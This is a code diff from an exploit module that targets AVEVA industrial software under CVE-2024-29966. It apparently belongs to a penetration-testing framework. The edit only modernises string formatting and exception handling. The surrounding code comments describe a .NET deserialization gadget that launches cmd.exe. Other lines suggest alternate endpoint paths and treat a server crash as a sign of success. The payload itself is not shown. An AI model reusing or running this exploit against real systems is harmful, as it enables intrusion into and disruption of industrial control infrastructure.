@@ -86,7 +86,7 @@ class Exploit(Exploit):
             print_info("Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-29966")
             return
 
-        print_status("[CVE-2024-29966] Targeting AVEVA at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2024-29966] Targeting AVEVA at {self.target}:{self.port} ...")
 
         # .NET deserialization gadget via ViewState / AJAX endpoint
         # Serialized ObjectDataProvider pointing to cmd.exe (ysoserial.net style)
@@ -138,13 +138,13 @@ class Exploit(Exploit):
                 elif "404" in resp_str:
                     print_warning("[CVE-2024-29966] 404 — try alternate path /api/v1/data or /Historian/REST/")
                 else:
-                    print_info("[CVE-2024-29966] Response: {}...".format(resp_str[:100]))
-            except socket.timeout:
+                    print_info(f"[CVE-2024-29966] Response: {resp_str[:100]}...")
+            except TimeoutError:
                 print_success("[CVE-2024-29966] Timeout after probe — server may have crashed (exploitation indicator)")
         except ConnectionRefusedError:
-            print_warning("[CVE-2024-29966] Connection refused — verify AVEVA service port {}".format(self.port))
+            print_warning(f"[CVE-2024-29966] Connection refused — verify AVEVA service port {self.port}")
         except Exception as exc:
-            print_error("[CVE-2024-29966] Error: {}".format(exc))
+            print_error(f"[CVE-2024-29966] Error: {exc}")
         finally:
             try:
                 sock.close()
